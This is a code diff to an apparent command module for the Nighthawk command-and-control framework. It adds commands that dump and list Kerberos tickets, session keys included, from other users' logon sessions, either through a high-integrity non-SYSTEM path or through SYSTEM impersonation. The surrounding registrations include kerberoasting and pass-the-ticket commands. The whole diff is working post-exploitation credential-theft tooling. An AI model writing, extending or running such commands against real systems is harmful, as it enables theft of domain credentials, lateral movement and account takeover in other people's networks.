@@ -77,6 +77,14 @@ def cmd_krb_dump(params, info):
     run_kerbeus(info, "dump", params)
 
 
+def cmd_krb_dump_high(params, info):
+    run_kerbeus(info, "dump", ["/high"] + list(params))
+
+
+def cmd_krb_dump_system(params, info):
+    run_kerbeus(info, "dump", ["/system"] + list(params))
+
+
 def cmd_krb_hash(params, info):
     run_kerbeus(info, "hash", params)
 
@@ -87,6 +95,14 @@ def cmd_krb_kerberoasting(params, info):
 
 def cmd_krb_klist(params, info):
     run_kerbeus(info, "klist", params)
+
+
+def cmd_krb_klist_high(params, info):
+    run_kerbeus(info, "klist", ["/high"] + list(params))
+
+
+def cmd_krb_klist_system(params, info):
+    run_kerbeus(info, "klist", ["/system"] + list(params))
 
 
 def cmd_krb_ptt(params, info):
@@ -161,10 +177,27 @@ nighthawk.register_command(cmd_krb_describe, "krb_describe",
     "krb_describe /ticket:doIF8DCCBey...")
 
 nighthawk.register_command(cmd_krb_dump, "krb_dump",
-    "Dump tickets from a logon session (base64). Admin/elevated required for other sessions",
+    "Dump tickets from a logon session (base64). Admin/elevated required for other sessions.\n"
+    "Use /high for high-integrity (non-SYSTEM) TGT dump via KerbRetrieveTicketMessage,\n"
+    "or /system for the classic SYSTEM (SeTcbPrivilege) path.",
     "Dump tickets",
-    "krb_dump [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]",
+    "krb_dump [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT] [/high|/system]",
     "krb_dump /luid:3ea8")
+
+nighthawk.register_command(cmd_krb_dump_high, "krb_dump_high",
+    "Dump TGTs from a high-integrity (non-SYSTEM) process via KerbRetrieveTicketMessage.\n"
+    "LSA returns full session keys for foreign LUIDs without SeTcbPrivilege.\n"
+    "Based on https://jakeotte.com/posts/klist-revisited.html",
+    "Dump TGTs (high integrity, no SYSTEM)",
+    "krb_dump_high [/luid:LOGINID] [/user:USER]",
+    "krb_dump_high")
+
+nighthawk.register_command(cmd_krb_dump_system, "krb_dump_system",
+    "Dump TGTs via the classic SYSTEM impersonation path (SeTcbPrivilege).\n"
+    "Enumerates all logon sessions and dumps every ticket with full session keys.",
+    "Dump TGTs (SYSTEM path)",
+    "krb_dump_system [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]",
+    "krb_dump_system /luid:3ea8")
 
 nighthawk.register_command(cmd_krb_hash, "krb_hash",
     "Calculate Kerberos key hashes (rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1)",
@@ -181,10 +214,23 @@ nighthawk.register_command(cmd_krb_kerberoasting, "krb_kerberoasting",
     "krb_kerberoasting /spn:CIFS/COMP.domain.local /ticket:doIF8DCCBey...")
 
 nighthawk.register_command(cmd_krb_klist, "krb_klist",
-    "List tickets in the current (or specified) logon session",
+    "List tickets in the current (or specified) logon session.\n"
+    "Use /high for high-integrity (non-SYSTEM) listing, or /system for the classic SYSTEM path.",
     "List tickets",
-    "krb_klist [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]",
+    "krb_klist [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT] [/high|/system]",
     "krb_klist /luid:3ea8")
+
+nighthawk.register_command(cmd_krb_klist_high, "krb_klist_high",
+    "List tickets from a high-integrity (non-SYSTEM) process via KerbRetrieveTicketMessage.",
+    "List tickets (high integrity, no SYSTEM)",
+    "krb_klist_high [/luid:LOGINID] [/user:USER]",
+    "krb_klist_high")
+
+nighthawk.register_command(cmd_krb_klist_system, "krb_klist_system",
+    "List tickets via the classic SYSTEM impersonation path (SeTcbPrivilege).",
+    "List tickets (SYSTEM path)",
+    "krb_klist_system [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]",
+    "krb_klist_system /luid:3ea8")
 
 nighthawk.register_command(cmd_krb_ptt, "krb_ptt",
     "Submit a TGT into the current (or specified) logon session",
